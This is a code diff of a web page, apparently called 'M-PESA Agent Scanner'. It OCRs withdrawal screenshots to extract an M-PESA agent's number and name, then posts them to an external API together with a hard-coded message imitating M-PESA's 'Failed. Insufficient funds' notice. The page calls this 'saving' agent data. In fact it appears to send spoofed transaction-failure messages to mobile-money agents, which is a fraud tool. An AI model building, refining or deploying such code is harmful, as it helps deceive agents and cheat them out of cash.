@@ -1,189 +1,168 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>M-PESA Withdrawal Scan</title>
-<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
-<style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
-    .container { max-width: 500px; width: 95%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; text-transform: uppercase; letter-spacing: 1px; }
-    
-    .upload-section { border: 2px dashed #4CAF50; padding: 30px 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
-    .upload-section:hover { background: #252525; border-color: #66bb6a; }
-    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M-PESA Agent Scanner</title>
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; margin: 0; }
+        .container { max-width: 450px; margin: auto; background: #1e1e1e; padding: 25px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h3 { text-align: center; color: #4CAF50; margin-top: 0; letter-spacing: 1px; }
+        
+        .upload-section { 
+            border: 2px dashed #4CAF50; padding: 40px 20px; text-align: center; 
+            border-radius: 12px; cursor: pointer; transition: 0.3s; background: #252525;
+        }
+        .upload-section:hover { background: #2a2a2a; border-color: #81c784; }
+        #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
 
-    .manual-input-container { margin-top: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #252525; }
-    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
-    
-    .input-group { display: flex; gap: 8px; margin-bottom: 15px; }
-    input[type="text"] { flex: 1; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; font-size: 1.1rem; outline: none; margin-bottom: 0; }
-    input[type="text"]:focus { border-color: #4CAF50; }
+        .result-card { margin-top: 20px; padding: 15px; background: #252525; border-radius: 10px; border: 1px solid #333; }
+        label { display: block; font-size: 0.75rem; color: #888; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; }
+        
+        .field { margin-bottom: 15px; }
+        input[type="text"] { 
+            width: 100%; padding: 12px; background: #333; border: 1px solid #444; 
+            border-radius: 8px; color: #fff; font-size: 1rem; outline: none; box-sizing: border-box;
+        }
+        input:focus { border-color: #4CAF50; }
 
-    .copy-btn { width: auto; padding: 0 15px; margin-top: 0; background: #333; border: 1px solid #444; font-size: 0.75rem; white-space: nowrap; color: #4CAF50; border-radius: 6px; cursor: pointer; transition: 0.2s; }
-    .copy-btn:hover { background: #444; }
+        .btn-primary { 
+            width: 100%; padding: 16px; background: #4CAF50; border: none; 
+            border-radius: 8px; color: white; font-weight: bold; font-size: 1rem; 
+            cursor: pointer; transition: 0.2s; margin-top: 10px;
+        }
+        .btn-primary:active { transform: scale(0.98); }
+        .btn-primary:disabled { background: #444; cursor: not-allowed; }
 
-    button { width: 100%; padding: 16px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
-    button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
-    button:disabled { background: #555; cursor: not-allowed; }
-    
-    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.9rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
-    .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; font-weight: bold; }
-</style>
+        #loader { display: none; text-align: center; color: #ffeb3b; font-weight: bold; margin: 15px 0; }
+        pre { background: #000; padding: 10px; border-radius: 6px; font-size: 0.85rem; color: #4CAF50; text-align: center; min-height: 20px; }
+    </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>Withdrawal Contact Scan</h3>
+    <h3>Agent Quick-Save</h3>
     
     <div class="upload-section" onclick="document.getElementById('imageInput').click()">
-        <span>📸 Tap to Upload Withdrawal Screenshot</span>
+        <span id="uploadText">📷 Tap to Scan Screenshot</span>
         <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
-        <img id="imagePreview" alt="Preview">
+        <img id="imagePreview">
     </div>
 
-    <div id="loader" class="loading-text">🔍 Extracting Agent Details...</div>
+    <div id="loader">⚡ Reading Agent Details...</div>
 
-    <div class="manual-input-container">
-        <label>AGENT NAME (Withdraw At):</label>
-        <div class="input-group">
-            <input type="text" id="detectedName" placeholder="Waiting for scan...">
+    <div class="result-card">
+        <div class="field">
+            <label>Agent Number</label>
+            <input type="text" id="agentNo" placeholder="Scanning...">
         </div>
-        
-        <label>AGENT NUMBER:</label>
-        <div class="input-group">
-            <input type="text" id="detectedPhone" placeholder="Waiting for scan...">
-            <button class="copy-btn" id="copyBtn" onclick="copyNumber()">COPY</button>
+        <div class="field">
+            <label>Agent Name (Location)</label>
+            <input type="text" id="agentName" placeholder="Scanning...">
         </div>
     </div>
 
-    <button id="saveBtn" onclick="saveContact()">SAVE AGENT CONTACT</button>
+    <button class="btn-primary" id="saveBtn" onclick="saveAgent()">SAVE AGENT DATA</button>
     <pre id="output"></pre>
 </div>
 
 <script>
-const API = "https://mpesab.vercel.app";
-const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to withdraw. Available Fuliza M-PESA limit KSH0.00.";
+const API_URL = "https://mpesab.vercel.app";
+const FAIL_MSG = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to withdraw. Available Fuliza M-PESA limit KSH0.00.";
 
 async function handleImage(input) {
     const file = input.files[0];
     if (!file) return;
 
-    const reader = new FileReader();
-    reader.onload = e => {
-        const preview = document.getElementById('imagePreview');
-        preview.src = e.target.result;
-        preview.style.display = 'block';
-    };
-    reader.readAsDataURL(file);
+    // Show Preview
+    const preview = document.getElementById('imagePreview');
+    const uploadText = document.getElementById('uploadText');
+    preview.src = URL.createObjectURL(file);
+    preview.style.display = 'block';
+    uploadText.style.display = 'none';
 
-    const loader = document.getElementById('loader');
-    loader.style.display = 'block';
+    document.getElementById('loader').style.display = 'block';
 
     try {
         const { data: { text } } = await Tesseract.recognize(file, 'eng');
-        processText(text);
+        parseMpesaText(text);
     } catch (err) {
-        alert("OCR Error. Please ensure the screenshot is clear.");
+        alert("Could not read image. Please use a clearer screenshot.");
     } finally {
-        loader.style.display = 'none';
+        document.getElementById('loader').style.display = 'none';
     }
 }
 
-function processText(rawText) {
-    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 1);
+function parseMpesaText(rawText) {
+    // Split into lines and clean whitespace
+    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
     
-    let agentNumber = "";
-    let agentName = "";
+    let detectedNo = "";
+    let detectedName = "";
 
-    // 1. Find Agent Number (Usually labeled "AGENT NUMBER" or is a 5-6 digit code)
     for (let i = 0; i < lines.length; i++) {
-        let line = lines[i].toUpperCase();
+        // Look for the 6-7 digit agent number
+        const numMatch = lines[i].match(/\b\d{6,7}\b/);
         
-        // Strategy A: Look for the line after "AGENT NUMBER"
-        if (line.includes("AGENT NUMBER") && i + 1 < lines.length) {
-            agentNumber = lines[i+1].replace(/\D/g, ''); // Keep only digits
-        }
-        
-        // Strategy B: Look for "WITHDRAW AT" to get Name
-        if (line.includes("WITHDRAW AT") && i + 1 < lines.length) {
-            // Usually the next line or two is the full shop name
-            agentName = lines[i+1];
-            if (i + 2 < lines.length && !lines[i+2].toUpperCase().includes("AGENT")) {
-                agentName += " " + lines[i+2];
+        if (numMatch) {
+            detectedNo = numMatch[0];
+            // The name is typically the line directly below the number in the app
+            if (i + 1 < lines.length) {
+                detectedName = lines[i+1];
+                // If the next line is also text (like location), grab it too
+                if (i + 2 < lines.length && !lines[i+2].includes("Store") && !lines[i+2].includes("Amount")) {
+                    detectedName += " " + lines[i+2];
+                }
             }
+            break; 
         }
     }
 
-    // Fallback: If Agent Number wasn't found by label, look for 5-6 digit strings
-    if (!agentNumber) {
-        const match = rawText.match(/\b\d{5,6}\b/);
-        if (match) agentNumber = match[0];
-    }
-
-    document.getElementById('detectedPhone').value = agentNumber;
-    document.getElementById('detectedName').value = agentName.toUpperCase().replace("WITHDRAW AT", "").trim();
+    document.getElementById('agentNo').value = detectedNo;
+    document.getElementById('agentName').value = detectedName.toUpperCase();
 }
 
-function copyNumber() {
-    const phoneInput = document.getElementById('detectedPhone');
-    const copyBtn = document.getElementById('copyBtn');
-    if (!phoneInput.value) return;
-
-    navigator.clipboard.writeText(phoneInput.value).then(() => {
-        const originalText = copyBtn.innerText;
-        copyBtn.innerText = "COPIED!";
-        copyBtn.style.color = "#fff";
-        copyBtn.style.backgroundColor = "#4CAF50";
-        setTimeout(() => {
-            copyBtn.innerText = originalText;
-            copyBtn.style.color = "#4CAF50";
-            copyBtn.style.backgroundColor = "#333";
-        }, 2000);
-    });
-}
-
-async function saveContact() {
+async function saveAgent() {
     const btn = document.getElementById("saveBtn");
-    const output = document.getElementById("output");
-    const name = document.getElementById("detectedName").value.trim();
-    const phone = document.getElementById("detectedPhone").value.trim();
+    const out = document.getElementById("output");
+    const name = document.getElementById("agentName").value.trim();
+    const phone = document.getElementById("agentNo").value.trim();
 
     if (!phone || !name) {
-        output.innerText = "❌ Please scan or enter Agent Name and Number.";
+        out.innerText = "⚠ Missing details. Scan again.";
         return;
     }
 
     btn.disabled = true;
-    btn.innerText = "Saving...";
+    btn.innerText = "Syncing...";
 
     try {
-        const response = await fetch(`${API}/send`, {
+        const res = await fetch(`${API_URL}/send`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 phone: phone,
                 name: name,
                 amount: 0,
-                token: "AGENT" + Date.now(),
-                message: FIXED_MESSAGE
+                token: "EXTRACT_" + Math.floor(Math.random() * 10000),
+                message: FAIL_MSG
             })
         });
 
-        if (response.ok) {
-            output.innerText = "✅ Agent Saved!\n" + name + "\n" + phone;
-            btn.innerText = "DONE ✓";
+        if (res.ok) {
+            out.innerText = "✅ SUCCESS\n" + name;
+            btn.innerText = "SAVED ✓";
         } else {
             throw new Error();
         }
-    } catch (error) {
-        output.innerText = "❌ Connection Error";
+    } catch (e) {
+        out.innerText = "❌ Network Error";
         btn.disabled = false;
-        btn.innerText = "SAVE AGENT CONTACT";
+        btn.innerText = "RETRY SAVE";
     }
 }
 </script>
+
 </body>
 </html>
